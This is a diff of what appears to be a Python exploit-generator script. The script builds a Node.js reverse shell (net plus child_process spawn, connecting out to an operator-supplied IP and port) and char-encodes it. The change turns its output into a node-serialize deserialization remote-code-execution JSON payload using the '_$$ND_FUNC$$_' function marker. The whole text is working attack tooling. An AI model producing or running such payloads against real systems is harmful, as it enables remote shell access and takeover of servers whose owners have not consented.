@@ -21,8 +21,8 @@ def charencode(string):
         encoded = encoded + "," + str(ord(char))
     return encoded[1:]
 
-print "[+] LHOST = %s" % (IP_ADDR)
-print "[+] LPORT = %s" % (PORT)
+#print "[+] LHOST = %s" % (IP_ADDR)
+#print "[+] LPORT = %s" % (PORT)
 NODEJS_REV_SHELL = '''
 var net = require('net');
 var spawn = require('child_process').spawn;
@@ -48,6 +48,6 @@ function c(HOST,PORT) {
 }
 c(HOST,PORT);
 ''' % (IP_ADDR, PORT)
-print "[+] Encoding"
+#print "[+] Encoding"
 PAYLOAD = charencode(NODEJS_REV_SHELL)
-print "eval(String.fromCharCode(%s))" % (PAYLOAD)
+print '{"rce":"_$$ND_FUNC$$_function (){  eval(String.fromCharCode(%s)) }()"}' % (PAYLOAD)
